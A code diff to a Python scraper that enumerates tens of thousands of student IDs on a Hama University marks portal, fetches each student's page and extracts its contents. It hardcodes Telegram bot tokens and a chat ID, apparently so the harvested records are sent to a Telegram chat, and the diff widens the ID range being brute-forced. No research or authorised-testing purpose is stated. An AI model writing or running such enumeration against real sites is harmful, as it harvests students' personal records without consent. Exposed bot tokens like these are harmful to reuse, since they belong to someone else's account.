@@ -6,7 +6,7 @@ import logging
 logging.basicConfig(level=logging.INFO)
 
 # Your Telegram bot token
-bot_token = '7429988534:AAG58DZGh4mGWOCs-kqv-0OU_dD5jjUvrv8'
+bot_token = '7320885745:AAHkjCwjHR7bzFST6O_hNgxPaulWo2Uyolc'
 # Your chat ID
 chat_id = '1311416362'
 
@@ -56,14 +56,14 @@ def extract_information(soup):
 # Main execution flow
 base_url = "http://app.hama-univ.edu.sy/StdMark/Student/"
 college_id = "?college=1"
-base_id = "81906"
+base_id = "8190"
 
 # Iterate over all possible combinations for 'xxxx' (0000 to 9999)
-for i in range(6570, 10000):
-    student_id = f"{base_id}{i:04d}"  # Generate student ID with leading zeros
+for i in range(30000):
+    student_id = f"{base_id}{i:05d}"  # Generate student ID with leading zeros
     url = f"{base_url}{student_id}{college_id}"
     logging.info(f"Checking URL: {url}")
-
+    
     soup = fetch_and_parse_page(url)
     if soup:
         info = extract_information(soup)
